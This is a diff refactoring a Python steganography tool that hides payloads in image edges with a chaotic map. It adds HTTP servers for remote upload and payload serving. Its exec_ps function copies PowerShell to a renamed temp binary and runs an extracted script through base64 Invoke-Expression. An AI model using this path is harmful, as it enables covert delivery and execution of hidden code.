@@ -2,24 +2,15 @@
 # coding:UTF-8
 import argparse
 import base64
-import hashlib
 import http.server
-import math
 import os
-import re
-import shutil
 import socketserver
-import subprocess
-import sys
-import tempfile
-from collections import Counter
+from typing import Union
 
 import cv2
 import numpy as np
-from mpmath import mp
-from tqdm import tqdm
 
-from ansi import *
+from .ansi import Fore, header
 
 
 class SteganographyError(Exception):
@@ -27,28 +18,23 @@ class SteganographyError(Exception):
 
 
 class ChaosEdgeSteg:
-    def __init__(self, key, image_path, output_path=None, save_bitmaps=False, verbose=False, debug=False, quiet=False):
-        self.verbose = verbose
-        self.debug = debug
-        self.quiet = quiet
+    def __init__(self, __key: str, img_path: str, **kwargs):
+        self.verbose = kwargs.get('verbose', False)
+        self.debug = kwargs.get('debug', False)
+        self.quiet = kwargs.get('quiet', False)
         self.gray_img = None
         self.edge_map = None
-        self.save_bitmaps = save_bitmaps
-        self.len_flag, actual_key = key.split('::', 1)
-        self.key = actual_key
-        self.payload_length = int(self.len_flag, 16)
-        self.image_path = image_path
-        if output_path:
-            self.output_dir = os.path.dirname(output_path)
+        self.save_bitmaps = kwargs.get('save_bitmaps', False)
+        self.prefix, self.key = __key.split('::', 1)
+        self.payload_len = int(self.prefix, 16)
+        self.image_path = img_path
+        if kwargs.get('output_path', None) is not None:
+            self.output_dir = os.path.dirname(kwargs['output_path'])
         else:
             self.output_dir = os.getcwd()
-        self.image = cv2.imread(image_path)
-        self.a, self.b = self._get_henon_params(actual_key)
-        self.henon_x, self.henon_y = self._get_henon_map()
-        self.edges = self._get_edges(self.image)
-        self.edge_coords = self._map_trajectory_to_edges()
+        self.edge_coords = self.get_edge_coordinates(cv2.imread(img_path))
 
-    def _print_msg(self, message, msg_type='regular'):
+    def print_message(self, message, msg_type='regular'):
         if self.quiet and msg_type != 'debug':
             return
         if msg_type == 'debug' and self.debug:
@@ -59,51 +45,55 @@ class ChaosEdgeSteg:
             print(f'[{Fore.RED}*{Fore.RESET}] {message}')
 
     @staticmethod
-    def _sha256_hashgen(data):
-        if isinstance(data, str):
-            data = data.encode('utf-8')
-        return hashlib.sha256(data).hexdigest()
+    def sha256_hashgen(__o: Union[str, bytes]):
+        from hashlib import sha256
+        if isinstance(__o, str):
+            __o = __o.encode('utf-8')
+        return sha256(__o).hexdigest()
 
-    def _save_bitmap(self, bitmap_name, image):
+    def save_bitmap(self, __img, __output_path):
         if self.save_bitmaps:
-            directory = self.output_dir
-            bitmaps_dir = os.path.join(directory, 'bitmaps')
+            output_dirname = self.output_dir
+            bitmaps_dir = os.path.join(output_dirname, 'bitmaps')
             if not os.path.exists(bitmaps_dir):
                 os.makedirs(bitmaps_dir)
-            bitmap_path = os.path.join(bitmaps_dir, bitmap_name)
-            cv2.imwrite(bitmap_path, image)
+            bitmap_path = os.path.join(bitmaps_dir, __output_path)
+            cv2.imwrite(bitmap_path, __img)
 
     @staticmethod
-    def _data_to_bin(data):
-        if isinstance(data, str):
-            return ''.join(format(ord(i), '08b') for i in data)
-        elif isinstance(data, bytes):
-            return ''.join(format(byte, '08b') for byte in data)
+    def data_to_bin(__o: Union[str, bytes]):
+        if isinstance(__o, str):
+            return ''.join(format(ord(i), '08b') for i in __o)
+        elif isinstance(__o, bytes):
+            return ''.join(format(byte, '08b') for byte in __o)
 
     @staticmethod
-    def _get_entropy(key):
-        char_count = Counter(key)
-        total_chars = len(key)
+    def entropy(__key: str):
+        from collections import Counter
+        from math import log2
+        char_count = Counter(__key)
+        total_chars = len(__key)
         entropy = 0
         for char, count in char_count.items():
             prob = count / total_chars
-            entropy -= prob * math.log2(prob)
+            entropy -= prob * log2(prob)
         return entropy
 
-    def _get_thresholds(self, image):
-        self._print_msg('Calculating adaptive thresholds...', msg_type='verbose')
-        base_lower = 45
-        base_upper = 135
-        min_lower = 85
-        min_upper = 255
-        filtered_img = cv2.bilateralFilter(image, d=9, sigmaColor=75, sigmaSpace=75)
-        norm_payload_size = self.payload_length / (filtered_img.shape[0] * filtered_img.shape[1])
-        self._print_msg(f'Normalized payload size: {norm_payload_size}', msg_type='debug')
+    def adaptive_thresholds(self, __img: np.ndarray):
+        self.print_message('Calculating adaptive thresholds...', msg_type='verbose')
+        base_lower, base_upper = (45, 135)
+        min_lower, min_upper = (85, 255)
+
+        filtered_img = cv2.bilateralFilter(__img, d=9, sigmaColor=75, sigmaSpace=75)
         standard_edge_map = cv2.Canny(filtered_img, base_lower, base_upper)
         edge_density = cv2.countNonZero(standard_edge_map) / (filtered_img.shape[0] * filtered_img.shape[1])
-        self._print_msg(f'Edge density: {edge_density}', msg_type='debug')
+        norm_payload_size = self.payload_len / (filtered_img.shape[0] * filtered_img.shape[1])
         payload_influence = norm_payload_size * 100
-        self._print_msg(f'Payload influence: {payload_influence}', msg_type='debug')
+
+        self.print_message(f'Normalized payload size: {norm_payload_size}', msg_type='debug')
+        self.print_message(f'Edge density: {edge_density}', msg_type='debug')
+        self.print_message(f'Payload influence: {payload_influence}', msg_type='debug')
+
         if 2 <= payload_influence < 2.5:
             import warnings
             warnings.warn(
@@ -111,28 +101,31 @@ class ChaosEdgeSteg:
         elif payload_influence >= 2.5:
             raise SteganographyError(
                 'Payload is too large for the given cover image')
-        combined_density = edge_density + payload_influence
-        threshold_scale = 1 - combined_density  # Scale the thresholds towards min values
-        _lower = int(base_lower + threshold_scale * (min_lower - base_lower))
-        _upper = int(base_upper + threshold_scale * (min_upper - base_upper))
-        self._print_msg(f'Thresholds after combined density adjustment: {_lower, _upper}', msg_type='debug')
-        return _lower, _upper
 
-    def _get_edges(self, image):
-        gray_img = cv2.cvtColor(image, cv2.COLOR_BGR2GRAY)
+        threshold_scale = 1 - (edge_density + payload_influence)  # Scale the thresholds towards min values
+        lower = int(base_lower + threshold_scale * (min_lower - base_lower))
+        upper = int(base_upper + threshold_scale * (min_upper - base_upper))
+        self.print_message(f'Thresholds after combined density adjustment: {lower, upper}', msg_type='debug')
+        return lower, upper
+
+    def get_edge_coordinates(self, img: np.ndarray):
+        gray_img = cv2.cvtColor(img, cv2.COLOR_BGR2GRAY)
         self.gray_img = gray_img
-        lower_threshold, upper_threshold = self._get_thresholds(image)
+        lower_threshold, upper_threshold = self.adaptive_thresholds(img)
         edge_map = cv2.Canny(gray_img, lower_threshold, upper_threshold)
-        self._save_bitmap('edge_map.png', edge_map)
+        self.save_bitmap(edge_map, 'edge_map.png')
         self.edge_map = edge_map
-        edge_coordinates = np.column_stack(np.where(edge_map))
+        edge_coordinates: np.ndarray = np.column_stack(np.where(edge_map))
         return edge_coordinates
 
-    def _get_henon_map(self):
+    def henon_map(self):
+        from mpmath import mp
         mp.dps = 50
         x, y = [mp.mpf('0.1')], [mp.mpf('0.1')]
-        a, b = mp.mpf(self.a), mp.mpf(self.b)
-        for i in range(self.payload_length * 8):
+        henon_params = self.henon_parameters(self.key)
+        a: float = mp.mpf(henon_params[0])
+        b: float = mp.mpf(henon_params[1])
+        for i in range(self.payload_len * 8):
             next_x = y[-1] + mp.mpf('1.0') - a * x[-1] ** 2
             next_y = b * x[-1]
             x.append(next_x)
@@ -141,31 +134,38 @@ class ChaosEdgeSteg:
         y = [float(val) for val in y]
         return x, y
 
-    def _get_henon_params(self, key):
-        self._print_msg('Generating Henon parameters from key...', msg_type='verbose')
-        entropy = self._get_entropy(key)
-        self._print_msg(f'Key entropy: {entropy}', msg_type='debug')
+    def henon_parameters(self, __key: str):
+        self.print_message('Generating Henon parameters from key...', msg_type='verbose')
+        entropy = self.entropy(__key)
+
         a = 1.4 - (0.2 * (entropy / 8))
         b = 0.3 + (0.1 * (entropy / 8))
-        self._print_msg(f'Parameter a: {a}', msg_type='debug')
-        self._print_msg(f'Parameter b: {b}', msg_type='debug')
+
+        self.print_message(f'Key entropy: {entropy}', msg_type='debug')
+        self.print_message(f'Parameter a: {a}', msg_type='debug')
+        self.print_message(f'Parameter b: {b}', msg_type='debug')
+
         return a, b
 
-    def _map_trajectory_to_edges(self):
-        self._print_msg('Detecting edges...', msg_type='verbose')
-        edge_coords = self.edges
+    def map_edges_to_henon(self):
+        self.print_message('Detecting edges...', msg_type='verbose')
+        edge_coords = self.edge_coords
         if len(edge_coords) == 0:
             raise SteganographyError(
                 'No edge coordinates detected')
-        henon_map = np.column_stack((self.henon_x, self.henon_y))
+
+        henon_map = np.column_stack(self.henon_map())
         norm_indices = (henon_map - henon_map.min()) / (henon_map.max() - henon_map.min())
         norm_indices *= (len(edge_coords) - 1)
         norm_indices = norm_indices.astype(int)
-        self._print_msg(f'Payload length: {self.payload_length}', msg_type='debug')
-        self._print_msg(f'Available indices: {str(len(norm_indices))}', msg_type='debug')
-        self._print_msg('Mapping chaotic trajectory to edge coordinates...')
+
+        self.print_message(f'Payload length: {self.payload_len}', msg_type='debug')
+        self.print_message(f'Available indices: {str(len(norm_indices))}', msg_type='debug')
+        self.print_message('Mapping chaotic trajectory to edge coordinates...')
+
         available_edge_mask = np.ones(len(edge_coords), dtype=bool)
         final_edge_coords = []
+        from tqdm import tqdm
         for index in tqdm(
                 norm_indices[:, 0], total=len(norm_indices), disable=self.quiet,
                 bar_format='{l_bar}{bar}| {n_fmt}/{total_fmt} [{elapsed}<{remaining}]', ascii='.#', leave=False):
@@ -177,24 +177,25 @@ class ChaosEdgeSteg:
                         'Exhausted all available edge coordinates: Payload is too large for the input image')
             final_edge_coords.append(edge_coords[index])
             available_edge_mask[index] = False
+
         final_edge_coords = np.array(final_edge_coords)
         edge_map = np.zeros_like(self.gray_img)
         edge_map[final_edge_coords[:, 0], final_edge_coords[:, 1]] = 255
-        self._save_bitmap('selected_edge_map.png', edge_map)
+        self.save_bitmap(edge_map, 'selected_edge_map.png')
         return final_edge_coords
 
-    def embed(self, img_path, payload):
-        self._print_msg('Embedding payload...')
-        bin_payload = self._data_to_bin(payload)
-        s_key = self.len_flag + '::' + self.key
-        key_hash = self._sha256_hashgen(s_key)
+    def embed(self, __payload: Union[str, bytes], __img_path: str):
+        self.print_message('Embedding payload...')
+        bin_payload = self.data_to_bin(__payload)
+        s_key = '::'.join([self.prefix, self.key])
+        key_hash = self.sha256_hashgen(s_key)
         bin_key_hash = bin(int(key_hash, 16))[2:].zfill(256)
         bin_payload = bin_key_hash + bin_payload
         bin_payload_length = len(bin_payload)
-        img = cv2.imread(img_path)
+        img = cv2.imread(__img_path)
         bin_idx = 0
         mod_channels = {}
-        for coord in self.edge_coords:
+        for coord in self.map_edges_to_henon():
             if bin_idx >= bin_payload_length:
                 break
             y, x = coord
@@ -207,16 +208,15 @@ class ChaosEdgeSteg:
             bin_idx += 1
         return img
 
-    def extract(self, stego_img_path):
-        if stego_img_path == self.image_path:
+    def extract(self, __img_path) -> bytes:
+        if __img_path == self.image_path:
             raise SteganographyError(
                 'Stego image is same as input image')
-        self._print_msg('Extracting payload...')
-        stego_img = cv2.imread(stego_img_path)
+        self.print_message('Extracting payload...')
+        stego_img = cv2.imread(__img_path)
         edge_coords = np.column_stack(np.where(self.edge_map))
-        x, y = self._get_henon_map()
-        henon_map = np.column_stack((x, y))
-        norm_indices = (henon_map - henon_map.min()) / (henon_map.max() - henon_map.min())
+        henon_map = np.column_stack(self.henon_map())
+        norm_indices: np.ndarray = (henon_map - henon_map.min()) / (henon_map.max() - henon_map.min())
         norm_indices *= (len(edge_coords) - 1)
         norm_indices = norm_indices.astype(int)
         edge_mask = np.ones(len(edge_coords), dtype=bool)
@@ -226,10 +226,10 @@ class ChaosEdgeSteg:
                 index = (index + 1) % len(edge_coords)
             final_edge_coords.append(edge_coords[index])
             edge_mask[index] = False
-        final_edge_coords = np.array(final_edge_coords)
         out_bits = []
         mod_channels = {}
-        for coord in final_edge_coords[:self.payload_length * 8]:
+        final_edge_coords = np.array(final_edge_coords)
+        for coord in final_edge_coords[:self.payload_len * 8]:
             y, x = coord
             coord_key = (x, y)
             channel = mod_channels.get(coord_key, 0)
@@ -242,18 +242,21 @@ class ChaosEdgeSteg:
         out_bin_payload = int(out_str, 2).to_bytes((len(out_str) + 7) // 8, byteorder='big')
         out_bin_key_hash = out_bin_payload[:32]
         out_key_hash = out_bin_key_hash.hex()
-        s_key = f'{self.len_flag}::{self.key}'.encode()
-        in_key_hash = self._sha256_hashgen(s_key)
-        self._print_msg(f'Extracted hash: {out_key_hash}', msg_type='debug')
-        self._print_msg(f'Generated hash: {in_key_hash}', msg_type='debug')
+        s_key = f'{self.prefix}::{self.key}'.encode()
+        in_key_hash = self.sha256_hashgen(s_key)
+
         if out_key_hash != in_key_hash:
             raise SteganographyError(
                 'Invalid key')
+
+        self.print_message(f'Extracted hash: {out_key_hash}', msg_type='debug')
+        self.print_message(f'Generated hash: {in_key_hash}', msg_type='debug')
+
         extracted_payload = out_bin_payload[32:]
         return extracted_payload
 
 
-class _PutHTTPRequestHandler(http.server.SimpleHTTPRequestHandler):
+class PutHTTPRequestHandler(http.server.SimpleHTTPRequestHandler):
     out_payload = None
 
     def __init__(self, *args, echo=False, quiet=False, obfuscate=False, steg_obj=None, filename=None, **kwargs):
@@ -265,13 +268,14 @@ class _PutHTTPRequestHandler(http.server.SimpleHTTPRequestHandler):
         self.filename = filename
         super().__init__(*args, **kwargs)
 
-    def _print_msg(self, message):
+    def print_message(self, message):
         if not self.quiet:
             print(f'[{Fore.CYAN}*{Fore.RESET}] {message}')
 
     def log_message(self, format, *args):
         if not self.log_printed:
-            self._print_msg(f'Received {self.command} request from {self.client_address[0]}:{self.client_address[1]}')
+            self.print_message(
+                f'Received {self.command} request from {self.client_address[0]}:{self.client_address[1]}')
             self.log_printed = True
 
     def version_string(self):
@@ -290,8 +294,8 @@ class _PutHTTPRequestHandler(http.server.SimpleHTTPRequestHandler):
         body = self.rfile.read(content_length)
         with open(self.filename, 'wb') as f:
             f.write(body)
-        _PutHTTPRequestHandler.out_payload = self.steg_obj.extract(self.filename)
-        if _PutHTTPRequestHandler.out_payload[:4] == b'PK\x03\x04':
+        PutHTTPRequestHandler.out_payload = self.steg_obj.extract(self.filename)
+        if PutHTTPRequestHandler.out_payload[:4] == b'PK\x03\x04':
             self.send_response(400)  # Bad Request
             self.send_header('Content-type', 'text/plain')
             self.end_headers()
@@ -306,29 +310,30 @@ class _PutHTTPRequestHandler(http.server.SimpleHTTPRequestHandler):
         self.end_headers()
         if self.echo:
             if self.obfuscate:
-                obf_payload = xor_obf(base64.b64encode(_PutHTTPRequestHandler.out_payload), [0x55, 0xFF])
+                obf_payload = xor_obf(base64.b64encode(PutHTTPRequestHandler.out_payload), [0x55, 0xFF])
                 self.wfile.write(obf_payload)
             else:
-                self.wfile.write(_PutHTTPRequestHandler.out_payload)
+                self.wfile.write(PutHTTPRequestHandler.out_payload)
         else:
             self.wfile.write(b' ')
         self.server.stop = True
 
 
-class _PayloadHTTPRequestHandler(http.server.SimpleHTTPRequestHandler):
+class PayloadHTTPRequestHandler(http.server.SimpleHTTPRequestHandler):
     def __init__(self, *args, quiet=False, filename=None, **kwargs):
         self.quiet = quiet
         self.log_printed = False
         self.filename = filename
         super().__init__(*args, **kwargs)
 
-    def _print_msg(self, message):
+    def print_message(self, message):
         if not self.quiet:
             print(f'[{Fore.CYAN}*{Fore.RESET}] {message}')
 
     def log_message(self, format, *args):
         if not self.log_printed:
-            self._print_msg(f'Received {self.command} request from {self.client_address[0]}:{self.client_address[1]}')
+            self.print_message(
+                f'Received {self.command} request from {self.client_address[0]}:{self.client_address[1]}')
             self.log_printed = True
 
     def do_GET(self):
@@ -340,21 +345,21 @@ class _PayloadHTTPRequestHandler(http.server.SimpleHTTPRequestHandler):
             self.server.stop = True
 
 
-def _make_handler_class(quiet, filename, directory):
-    class CustomHandler(_PayloadHTTPRequestHandler):
+def make_handler_instance(filename: str, dirname: str, quiet: bool):
+    class CustomHandler(PayloadHTTPRequestHandler):
         def __init__(self, *args, **kwargs):
-            super().__init__(*args, quiet=quiet, filename=filename, directory=directory, **kwargs)
+            super().__init__(*args, quiet=quiet, filename=filename, directory=dirname, **kwargs)
 
 
     return CustomHandler
 
 
-def _start_http_put_server(args, steg, filename):
+def start_http_put_server(__obj, __filename, args: argparse.Namespace):
     echo_val = args.echo
     obf_val = args.obfuscate
     msg_prefix = f'[{Fore.CYAN}*{Fore.RESET}]' if not args.quiet else '#'
-    handler = lambda *args: _PutHTTPRequestHandler(
-        *args, echo=echo_val, obfuscate=obf_val, steg_obj=steg, filename=filename)
+    handler = lambda *args: PutHTTPRequestHandler(
+        *args, echo=echo_val, obfuscate=obf_val, steg_obj=__obj, filename=__filename)
     httpd = socketserver.TCPServer((args.remote_stego_image[1], int(args.remote_stego_image[2])), handler)
     httpd.timeout = 1
     httpd.stop = False
@@ -369,8 +374,8 @@ def _start_http_put_server(args, steg, filename):
         exit(0)
 
 
-def _handle_http_server(args, lhost, lport, handler_class):
-    httpd = socketserver.TCPServer((lhost, lport), handler_class)
+def handle_http_server(__handler, lhost, lport, args: argparse.Namespace):
+    httpd = socketserver.TCPServer((lhost, lport), __handler)
     httpd.timeout = 1
     httpd.stop = False
     msg_prefix = f'[{Fore.CYAN}*{Fore.RESET}]' if not args.quiet else '#'
@@ -385,65 +390,67 @@ def _handle_http_server(args, lhost, lport, handler_class):
         return
 
 
-def _serve_http_payload(extracted_payload, args):
+def serve_http_payload(__payload: Union[str, bytes], args: argparse.Namespace):
     if args.remote_output_file:
         output_file_path, lhost, lport = args.remote_output_file
-        _save_payload(extracted_payload, output_file_path, is_binary=True)
-        handler_class = _make_handler_class(args.quiet, output_file_path, os.getcwd())
-        _handle_http_server(args, lhost, int(lport), handler_class)
+        save_payload(__payload, output_file_path)
+        handler_class = make_handler_instance(output_file_path, os.getcwd(), args.quiet)
+        handle_http_server(handler_class, lhost=lhost, lport=int(lport), args=args)
         os.remove(output_file_path)
         exit(0)
 
 
-def _save_payload(payload, output_file_path, is_binary=True):
-    mode = 'wb' if is_binary else 'w'
-    with open(output_file_path, mode) as file:
-        file.write(payload)
+def save_payload(__payload: Union[str, bytes], __filepath: str):
+    with open(__filepath, 'wb' if isinstance(__payload, bytes) else 'w') as file:
+        file.write(__payload)
 
 
-def _exec_ps(extracted_text, suffix):
-    if suffix not in ['pwsh', 'py']:
+def exec_ps(__payload: str, *, exec_type: str):
+    from shutil import copy2, which
+    from subprocess import Popen
+    from tempfile import gettempdir
+    if exec_type not in ['pwsh', 'py']:
         return
-    b64_script = base64.b64encode(extracted_text.encode('utf-8')).decode('utf-8')
-    if shutil.which('PowerShell.exe'):
-        ps_path = shutil.which('PowerShell.exe')
-        tmp_ps_path = os.path.join(tempfile.gettempdir(), 'tmp_pwsh.exe')
-        shutil.copy2(ps_path, tmp_ps_path)
-        if suffix == 'pwsh':
+    b64_script = base64.b64encode(__payload.encode('utf-8')).decode('utf-8')
+    if which('PowerShell.exe'):
+        ps_path = which('PowerShell.exe')
+        tmp_ps_path = os.path.join(gettempdir(), 'tmp_pwsh.exe')
+        copy2(ps_path, tmp_ps_path)
+        if exec_type == 'pwsh':
             ps_cmd = f"""{tmp_ps_path} -noprofile -noninteractive Invoke-Expression \
                     \"$([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('{b64_script}')))\""""
         else:
             ps_cmd = f"""{tmp_ps_path} -noprofile -noninteractive -Command \
                     [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('{b64_script}')) | python"""
-        process = subprocess.Popen(ps_cmd, shell=True)
+        process = Popen(ps_cmd, shell=True)
         process.communicate()
         os.remove(tmp_ps_path)
-    elif shutil.which('pwsh'):
+    elif which('pwsh'):
         ps_cmd = f"""pwsh -noprofile -noninteractive -Command \
                 [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('{b64_script}')) | python"""
-        process = subprocess.Popen(ps_cmd, shell=True)
+        process = Popen(ps_cmd, shell=True)
         process.communicate()
     else:
         raise ValueError(
             "'ps_execute': Unable to find 'PowerShell' or 'PowerShell Core' on this system")
 
 
-def _handle_payload(extracted_payload, args):
-    def _zip():
+def handle_payload(__payload: bytes, args: argparse.Namespace):
+    def handle_zip():
         output_file_path = args.output_file if args.output_file else 'extracted.zip'
-        _save_payload(extracted_payload, output_file_path, is_binary=True)
+        save_payload(__payload, output_file_path)
         if not args.quiet:
             print(f"Extracted ZIP archive saved as '{output_file_path}'")
 
-    def _text():
-        extracted_text = extracted_payload.decode('utf-8', errors='replace')
+    def handle_txt():
+        extracted_text = __payload.decode('utf-8', errors='replace')
         prefix = 'Obfuscated payload' if args.obfuscate else 'Payload'
         if not (args.quiet or args.echo) and not args.output_file:
             print('\nExtracted payload:\n')
         if args.echo:
             print(f'[{Fore.CYAN}*{Fore.RESET}] {prefix} echoed back to remote host')
         elif args.ps_execute:
-            _exec_ps(extracted_text, args.ps_execute)
+            exec_ps(extracted_text, exec_type=args.ps_execute)
         else:
             print(f'{extracted_text}')
         if args.output_file:
@@ -451,13 +458,13 @@ def _handle_payload(extracted_payload, args):
                 output_file_path = os.path.splitext(args.output_file)[0] + '.txt'
             else:
                 output_file_path = args.output_file
-            _save_payload(extracted_text, output_file_path, is_binary=False)
+            save_payload(extracted_text, output_file_path)
             print(f"Extracted payload saved as '{output_file_path}'")
 
-    _zip() if extracted_payload[:4] == b'PK\x03\x04' else _text()
+    handle_zip() if __payload[:4] == b'PK\x03\x04' else handle_txt()
 
 
-def _embed(args):
+def embed(args: argparse.Namespace):
     if args.payload and args.payload_file:
         raise ValueError(
             "Cannot use '-p' and '-f' simultaneously")
@@ -480,57 +487,40 @@ def _embed(args):
     else:
         raise ValueError(
             "Either '-p' or '-f' must be provided to specify the payload")
-    payload_byte_length = len(payload.encode('utf-8')) if isinstance(payload, str) else len(payload)
-    adjusted_length = payload_byte_length + 32
-    hex_length = f'{adjusted_length:04X}'
-    adjusted_key = f'{hex_length}::{args.key}'
+    payload_len = len(payload.encode('utf-8')) if isinstance(payload, str) else len(payload)
+    payload_and_hash_len = payload_len + 32
+    hex_len = f'{payload_and_hash_len:04X}'
+    prefixed_key_str = f'{hex_len}::{args.key}'
     steg = ChaosEdgeSteg(
-        adjusted_key, args.cover_image_path, args.output_image_path, args.save_bitmaps, args.verbose, args.debug,
-        args.quiet)
-    stego_image = steg.embed(args.cover_image_path, payload)
+        prefixed_key_str, args.cover_image_path, output_path=args.output_image_path, save_bitmaps=args.save_bitmaps,
+        quiet=args.quiet, verbose=args.verbose, debug=args.debug)
+    stego_image = steg.embed(payload, args.cover_image_path)
     if args.save_key:
         if args.output_image_path:
-            _dir = os.path.dirname(args.output_image_path)
+            dirname = os.path.dirname(args.output_image_path)
         else:
-            _dir = os.getcwd()
+            dirname = os.getcwd()
             print('No output image path was specified. Saving key to the current directory')
-        key_path = os.path.join(_dir, 'key.txt')
+        key_path = os.path.join(dirname, 'key.txt')
         with open(key_path, 'w') as file:
-            file.write(adjusted_key)
+            file.write(prefixed_key_str)
         print(f"Key saved as '{key_path}'")
     elif not args.save_key:
-        print(f"Key with hex length appended: '{adjusted_key}'") if not args.quiet else print(adjusted_key)
+        print(f"Key with hex length appended: '{prefixed_key_str}'") if not args.quiet else print(prefixed_key_str)
     if args.output_image_path:
         output_img_path = os.path.splitext(args.output_image_path)[0] + '.png'
     else:
-        _dir = os.getcwd()
+        dirname = os.getcwd()
         output_img_path = os.path.join(
-            _dir, f'stego_{os.path.splitext(os.path.basename(args.cover_image_path))[0]}.png')
+            dirname, f'stego_{os.path.splitext(os.path.basename(args.cover_image_path))[0]}.png')
     cv2.imwrite(output_img_path, stego_image)
     if not args.quiet:
         print(f"Stego image saved as '{output_img_path}'")
 
 
-def _extract(args):
-    def handle_remote():
-        filename, lhost, lport = args.remote_stego_image
-        if os.path.splitext(filename)[1] != '.png':
-            raise ValueError(
-                "Invalid file format for stego image: Only '.png' images are supported.")
-        steg = ChaosEdgeSteg(args.key, args.cover_image_path, '', False, args.verbose, args.debug, args.quiet)
-        _start_http_put_server(args, steg, filename)
-        extracted_payload = _PutHTTPRequestHandler.out_payload if _PutHTTPRequestHandler.out_payload else steg.extract(
-            filename)
-        _handle_payload(extracted_payload, args)
-        _serve_http_payload(extracted_payload, args)
-
-    def handle_local():
-        steg = ChaosEdgeSteg(args.key, args.cover_image_path, '', False, args.verbose, args.debug, args.quiet)
-        extracted_payload = steg.extract(args.stego_image_path)
-        _handle_payload(extracted_payload, args)
-        _serve_http_payload(extracted_payload, args)
-
-    if not re.match(r"^[0-9A-Fa-f]+::", args.key):
+def extract(args: argparse.Namespace):
+    from re import match as regex_match
+    if not regex_match(r'^[0-9A-Fa-f]+::', args.key):
         raise ValueError(
             f"Unexpected key format: Does not match '[HEX_LENGTH]::[KEY]': '{args.key}'")
     if args.ps_execute and (args.echo or args.remote_output_file):
@@ -541,6 +531,26 @@ def _extract(args):
     if args.echo and not args.remote_stego_image:
         raise ValueError(
             "'echo': Can only be used with 'remote_stego_image'")
+    steg = ChaosEdgeSteg(
+        args.key, args.cover_image_path, output_path=None, save_bitmaps=False, quiet=args.quiet, verbose=args.verbose,
+        debug=args.debug)
+
+    def handle_remote():
+        filename, lhost, lport = args.remote_stego_image
+        if os.path.splitext(filename)[1] != '.png':
+            raise ValueError(
+                "Invalid file format for stego image: Only '.png' images are supported.")
+        start_http_put_server(steg, filename, args)
+        extracted_payload = PutHTTPRequestHandler.out_payload if PutHTTPRequestHandler.out_payload else steg.extract(
+            filename)
+        handle_payload(extracted_payload, args)
+        serve_http_payload(extracted_payload, args)
+
+    def handle_local():
+        extracted_payload = steg.extract(args.stego_image_path)
+        handle_payload(extracted_payload, args)
+        serve_http_payload(extracted_payload, args)
+
     handle_remote() if args.remote_stego_image else handle_local()
 
 
@@ -548,6 +558,7 @@ def main_cli():
     parser = argparse.ArgumentParser(
         prog='python -m chaosedgesteg', description='ChaosEdgeSteg: A chaos-based edge adaptive steganography tool')
     subparsers = parser.add_subparsers()
+
     # Embed action arguments
     embed_parser = subparsers.add_parser('embed', help='Embed payload into an image')
     embed_parser.add_argument('-c', '--cover_image_path', required=True, help='Path to the cover image')
@@ -567,7 +578,8 @@ def main_cli():
     embed_parser.add_argument('-v', '--verbose', action='store_true', default=False, help='Enable verbose output')
     embed_parser.add_argument('-vv', '--debug', action='store_true', default=False, help='Enable debug output')
     embed_parser.add_argument('-q', '--quiet', action='store_true', default=False, help='Suppress output messages')
-    embed_parser.set_defaults(func=_embed)
+    embed_parser.set_defaults(func=embed)
+
     # Extract action arguments
     extract_parser = subparsers.add_parser('extract', help='Extract payload from a stego image')
     extract_parser.add_argument(
@@ -604,13 +616,17 @@ def main_cli():
         '-psx', '--ps_execute', type=str, default=False,
         help='Executes the extracted payload in a temp PowerShell instance. Valid params: ('
              '\'python\', \'pwsh\')')
-    extract_parser.set_defaults(func=_extract)
-    args = parser.parse_args()
-    _header = header()
-    if len(sys.argv) == 1:
-        print(_header)
+    extract_parser.set_defaults(func=extract)
+
+    from sys import argv as sys_argv, exit as sys_exit
+    if len(sys_argv) == 1:
+        print(header())
         parser.print_help()
-        sys.exit(1)
+        sys_exit(1)
+
+    args = parser.parse_args()
+
     if not args.quiet:
-        print(_header)
+        print(header())
+
     args.func(args)
